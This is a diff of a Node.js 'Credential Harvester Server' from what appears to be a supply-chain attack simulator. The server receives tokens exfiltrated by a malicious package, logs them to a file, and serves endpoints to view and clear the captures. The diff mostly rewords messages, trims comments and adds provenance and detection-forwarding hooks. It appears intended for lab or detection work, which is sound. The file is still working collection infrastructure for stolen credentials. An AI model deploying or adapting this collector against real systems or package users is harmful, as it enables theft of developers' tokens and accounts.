@@ -1,8 +1,9 @@
 /**
- * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori — Supply Chain Attack Simulator
  * Credential Harvester Server
- * Receives and logs exfiltrated credentials
+ * Receives and logs exfiltrated tokens from the malicious package.
  */
+
+require('./scenario-provenance');
 
 const http = require('http');
 const fs = require('fs');
@@ -11,7 +12,6 @@ const path = require('path');
 const PORT = 3001;
 const logFile = path.join(__dirname, 'captured-credentials.json');
 
-// Initialize log file
 if (!fs.existsSync(logFile)) {
   fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
 }
@@ -19,50 +19,48 @@ if (!fs.existsSync(logFile)) {
 const server = http.createServer((req, res) => {
   if (req.method === 'POST' && req.url === '/collect') {
     let body = '';
-    
-    req.on('data', chunk => {
+
+    req.on('data', (chunk) => {
       body += chunk.toString();
     });
-    
+
     req.on('end', () => {
       try {
         const data = JSON.parse(body);
-        
-        // Log to console
-        console.log('\n🎯 CAPTURED CREDENTIALS:');
+        console.log('\nCAPTURED TOKENS:');
         console.log(JSON.stringify(data, null, 2));
-        console.log('─'.repeat(50));
-        
-        // Save to file
+        console.log('-'.repeat(50));
+
         const captures = JSON.parse(fs.readFileSync(logFile, 'utf8'));
         const captureEntry = {
           timestamp: new Date().toISOString(),
-          data: data
+          data
         };
         captures.captures.push(captureEntry);
         fs.writeFileSync(logFile, JSON.stringify(captures, null, 2));
-        require('../../../detection-tools/es/forward-capture')
-          .forwardCaptureIfEnabled(__dirname, captureEntry)
-          .catch(() => {});
-        
+
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'success', message: 'Credentials received' }));
+        res.end(JSON.stringify({ status: 'success', message: 'Tokens received' }));
+
+        try {
+          require('../../../detection-tools/es/forward-capture')
+            .forwardCaptureIfEnabled(__dirname, captureEntry)
+            .catch(() => {});
+        } catch (_) {}
       } catch (e) {
-        console.error('Error processing credentials:', e);
+        console.error('Error processing tokens:', e);
         res.writeHead(400);
         res.end('Bad Request');
       }
     });
   } else if (req.method === 'GET' && req.url === '/captured-credentials') {
-    // Endpoint to view captured credentials
     const captures = fs.readFileSync(logFile, 'utf8');
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(captures);
   } else if (req.method === 'DELETE' && req.url === '/captured-credentials') {
-    // Endpoint to clear captured credentials
     fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ status: 'success', message: 'Credentials cleared' }));
+    res.end(JSON.stringify({ status: 'success', message: 'Captures cleared' }));
   } else {
     res.writeHead(404);
     res.end('Not Found');
@@ -70,14 +68,14 @@ const server = http.createServer((req, res) => {
 });
 
 server.listen(PORT, () => {
-  console.log('🎭 Credential Harvester Started');
-  console.log('─'.repeat(50));
+  console.log('Credential Harvester Started');
+  console.log('-'.repeat(50));
   console.log(`Listening on http://localhost:${PORT}`);
   console.log('');
   console.log('Endpoints:');
-  console.log(`  POST   /collect              - Receive exfiltrated credentials`);
-  console.log(`  GET    /captured-credentials  - View captured credentials`);
-  console.log(`  DELETE /captured-credentials  - Clear captured credentials`);
-  console.log('─'.repeat(50));
-  console.log('Waiting for credentials...\n');
+  console.log(`  POST   /collect              - Receive exfiltrated tokens`);
+  console.log(`  GET    /captured-credentials  - View captured tokens`);
+  console.log(`  DELETE /captured-credentials  - Clear captured tokens`);
+  console.log('-'.repeat(50));
+  console.log('Waiting for tokens...\n');
 });
